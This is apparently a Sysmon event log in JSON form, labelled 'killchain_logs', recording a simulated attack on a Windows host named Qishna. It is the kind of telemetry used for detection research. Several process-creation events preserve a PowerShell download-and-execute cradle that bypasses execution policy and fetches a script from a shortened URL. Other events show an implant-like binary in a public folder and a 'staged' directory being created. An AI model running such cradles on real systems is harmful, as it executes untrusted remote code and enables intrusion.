{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:22.486547"}, "EventRecordID": 19125, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:22.485", "ProcessGuid": "{4e85e66a-51c6-5f35-1646-000000004300}", "ProcessId": 15280, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_cpzwnfcp.om3.psm1", "CreationUtcTime": "2020-08-13 14:44:22.485"}, "fields": {"time": 1597304662.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:22.619329"}, "EventRecordID": 19126, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:44:22.618", "ProcessGuid": "{4e85e66a-51c6-5f35-1646-000000004300}", "ProcessId": 15280, "PipeName": "\\PSHost.132418034620689378.15280.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304662.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:23.943920"}, "EventRecordID": 19127, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:44:23.579", "ProcessGuid": "{4e85e66a-51c7-5f35-1746-000000004300}", "ProcessId": 16416, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c IEX c:\\windows\\system32\\calc.exe", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-51c6-5f35-1646-000000004300}", "ParentProcessId": 15280, "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentCommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\\\"https://bit.ly/33H0QXi\\\")\""}, "fields": {"time": 1597304663.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:24.039341"}, "EventRecordID": 19128, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16764}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "NetworkConnect include Group", "UtcTime": "2020-08-13 14:44:27.312", "ProcessGuid": "{4e85e66a-100f-5f31-6000-000000004300}", "ProcessId": 3708, "Image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2007.8-0\\MsMpEng.exe", "User": "NT AUTHORITY\\\u0421\u0418\u0421\u0422\u0415\u041c\u0410", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 58341, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "40.115.119.185", "DestinationHostname": "-", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597304664.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:24.040316"}, "EventRecordID": 19129, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16764}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "NetworkConnect include Group", "UtcTime": "2020-08-13 14:44:27.440", "ProcessGuid": "{4e85e66a-100f-5f31-6000-000000004300}", "ProcessId": 3708, "Image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2007.8-0\\MsMpEng.exe", "User": "NT AUTHORITY\\\u0421\u0418\u0421\u0422\u0415\u041c\u0410", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 58342, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "40.115.119.185", "DestinationHostname": "-", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597304664.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:24.045372"}, "EventRecordID": 19130, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:24.037", "ProcessGuid": "{4e85e66a-51c7-5f35-1746-000000004300}", "ProcessId": 16416, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ooops4kw.t4y.ps1", "CreationUtcTime": "2020-08-13 14:44:24.037"}, "fields": {"time": 1597304664.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:24.064703"}, "EventRecordID": 19131, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:24.042", "ProcessGuid": "{4e85e66a-51c7-5f35-1746-000000004300}", "ProcessId": 16416, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_vz2mobvt.2gh.psm1", "CreationUtcTime": "2020-08-13 14:44:24.041"}, "fields": {"time": 1597304664.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:24.127464"}, "EventRecordID": 19132, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:44:24.112", "ProcessGuid": "{4e85e66a-51c7-5f35-1746-000000004300}", "ProcessId": 16416, "PipeName": "\\PSHost.132418034635790082.16416.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304664.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:24.360518"}, "EventRecordID": 19133, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:44:24.355", "ProcessGuid": "{4e85e66a-51c8-5f35-1846-000000004300}", "ProcessId": 15744, "Image": "C:\\Windows\\System32\\calc.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows Calculator", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "CALC.EXE", "CommandLine": "\"C:\\windows\\system32\\calc.exe\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=F88CC05134C555D4E1CD1DEF78162A9A,SHA256=A103A57D50B32469C5811E2808F021ADF9D9220093B540B8A9C83B5C821D370E,IMPHASH=8EEAA9499666119D13B3F44ECD77A729", "ParentProcessGuid": "{4e85e66a-51c7-5f35-1746-000000004300}", "ParentProcessId": 16416, "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c IEX c:\\windows\\system32\\calc.exe"}, "fields": {"time": 1597304664.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:24.374567"}, "EventRecordID": 19134, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:24.373", "ProcessGuid": "{4e85e66a-51c7-5f35-1746-000000004300}", "ProcessId": 16416, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304664.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:24.517630"}, "EventRecordID": 19135, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:24.516", "ProcessGuid": "{4e85e66a-51c6-5f35-1646-000000004300}", "ProcessId": 15280, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304664.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:25.045187"}, "EventRecordID": 19136, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16764}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "Info=Unknown Process Connecting to network", "UtcTime": "2020-08-13 14:44:27.973", "ProcessGuid": "{4e85e66a-51c6-5f35-1646-000000004300}", "ProcessId": 15280, "Image": "<unknown process>", "User": "QISHNA\\garip", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 58343, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "67.199.248.10", "DestinationHostname": "bit.ly", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597304665.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:25.045374"}, "EventRecordID": 19137, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16764}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "Info=Powershell Network Connection,suspicious_net_event=True", "UtcTime": "2020-08-13 14:44:28.329", "ProcessGuid": "{4e85e66a-51c6-5f35-1646-000000004300}", "ProcessId": 15280, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "QISHNA\\garip", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 58344, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "151.101.36.133", "DestinationHostname": "-", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597304665.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:47.083477"}, "EventRecordID": 19138, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:44:47.076", "ProcessGuid": "{4e85e66a-51df-5f35-1a46-000000004300}", "ProcessId": 18968, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"New-Item -Path \\\".\\\" -Name \\\"staged\\\" -ItemType \\\"directory\\\" -Force | foreach {$_.FullName} | Select-Object\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304687.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:47.187227"}, "EventRecordID": 19139, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:47.178", "ProcessGuid": "{4e85e66a-51df-5f35-1a46-000000004300}", "ProcessId": 18968, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_c4kgkg4g.gdk.ps1", "CreationUtcTime": "2020-08-13 14:44:47.178"}, "fields": {"time": 1597304687.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:47.203629"}, "EventRecordID": 19140, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:47.182", "ProcessGuid": "{4e85e66a-51df-5f35-1a46-000000004300}", "ProcessId": 18968, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ialpubp1.1x5.psm1", "CreationUtcTime": "2020-08-13 14:44:47.182"}, "fields": {"time": 1597304687.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 17}, "Version": 1, "Level": 4, "Task": 17, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:47.277584"}, "EventRecordID": 19141, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "PipeEvent include Group", "EventType": "CreatePipe", "UtcTime": "2020-08-13 14:44:47.254", "ProcessGuid": "{4e85e66a-51df-5f35-1a46-000000004300}", "ProcessId": 18968, "PipeName": "\\PSHost.132418034870766590.18968.DefaultAppDomain.powershell", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}, "fields": {"time": 1597304687.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:47.576651"}, "EventRecordID": 19142, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:47.575", "ProcessGuid": "{4e85e66a-51df-5f35-1a46-000000004300}", "ProcessId": 18968, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Windows\\System32\\staged", "CreationUtcTime": "2020-08-13 14:44:47.575"}, "fields": {"time": 1597304687.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:47.599762"}, "EventRecordID": 19143, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:47.598", "ProcessGuid": "{4e85e66a-51df-5f35-1a46-000000004300}", "ProcessId": 18968, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive", "CreationUtcTime": "2019-08-09 14:16:02.521"}, "fields": {"time": 1597304687.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
